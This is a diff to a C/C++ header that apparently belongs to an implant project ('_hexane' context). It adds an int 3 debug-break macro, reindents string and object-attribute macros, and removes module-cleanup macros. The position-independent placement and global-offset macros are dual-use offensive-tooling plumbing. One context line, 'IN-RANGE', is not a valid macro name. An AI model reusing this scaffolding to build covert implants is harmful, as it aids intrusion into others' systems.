@@ -33,6 +33,7 @@ typedef uint64_t uint64;
 #define ntstatus                        ctx->teb->LastErrorValue
 #define GLOBAL_OFFSET                   (U_PTR(InstStart()) + U_PTR( &__global ))
 #define HEXANE                          _hexane *ctx = (_hexane*) C_DREF(GLOBAL_OFFSET)
+#define __xdbg()                        __asm__ volatile("int 3")
 
 #define B_PTR(x)                        ((PBYTE) x)
 #define C_PTR(x)                        ((LPVOID) x)
@@ -45,8 +46,8 @@ typedef uint64_t uint64;
 #define P_TYPE(T, x)                    ((T*) x)
 
 
-#define DTYPE(x)						    decltype(x) *x
-#define FUNCTION						    TEXT_SECTION(B)
+#define DTYPE(x)						decltype(x) *x
+#define FUNCTION						TEXT_SECTION(B)
 #define CONFIG                          TEXT_SECTION(F)
 #define SECTION(x)                      __attribute__((used, section(x)))
 #define TEXT_SECTION(x)                 __attribute__((used, section(".text$" #x "")))
@@ -102,43 +103,23 @@ typedef uint64_t uint64;
 #define DYN_ARRAY_LEN(i, p)     while (p[i]) { i++; }
 #define IN-RANGE(b, e, x)       (x >= b && x < e)
 
-#define FILL_MBS(s, b)             \
-s.length = (USHORT) MbsLength(b);  \
-s.max_length = s.length;           \
-s.buffer = b
+#define FILL_MBS(s, b)							\
+	s.length = (USHORT) MbsLength(b);			\
+	s.max_length = s.length;					\
+	s.buffer = b
 
-#define FILL_WCS(s, b)             \
-s.length = (USHORT) WcsLength(b);  \
-s.max_length = s.length;           \
-s.buffer = b
+#define FILL_WCS(s, b)							\
+	s.length = (USHORT) WcsLength(b);			\
+	s.max_length = s.length;					\
+	s.buffer = b
 
-#define InitializeObjectAttributes(ptr, name, attr, root, sec) \
-(ptr)->Length = sizeof( OBJECT_ATTRIBUTES);                \
-(ptr)->RootDirectory = root;                               \
-(ptr)->Attributes = attr;                                  \
-(ptr)->ObjectName = name;                                  \
-(ptr)->SecurityDescriptor = sec;                           \
-(ptr)->SecurityQualityOfService = NULL
-
-#define CLEANUP_MODULE(x)      \
-	CleanupModule(x);          \
-	x->buffer = nullptr;       \
-	x->local_name = nullptr;   \
-	x->cracked_name = nullptr;
-
-#define DESTROY_MODULE(x)      \
-	CleanupModule(x);          \
-	x->buffer = nullptr;       \
-	x->local_name = nullptr;   \
-	x->cracked_name = nullptr; \
-	if (x->base) {             \
-	    ctx->win32.NtFreeVirtualMemory(NtCurrentProcess(), (VOID**) &x->base, &x->base_size, MEM_RELEASE);\
-	}                          \
-	x->base = nullptr;         \
-	if (x) {                   \
-	    Free(x);               \
-        x = nullptr;           \
-    }
+#define InitializeObjectAttributes(ptr, name, attr, root, sec)	\
+	(ptr)->Length = sizeof( OBJECT_ATTRIBUTES);					\
+	(ptr)->RootDirectory = root;								\
+	(ptr)->Attributes = attr;									\
+	(ptr)->ObjectName = name;									\
+	(ptr)->SecurityDescriptor = sec;							\
+	(ptr)->SecurityQualityOfService = NULL
 
 #ifdef _M_X64
 #define X64                                     true
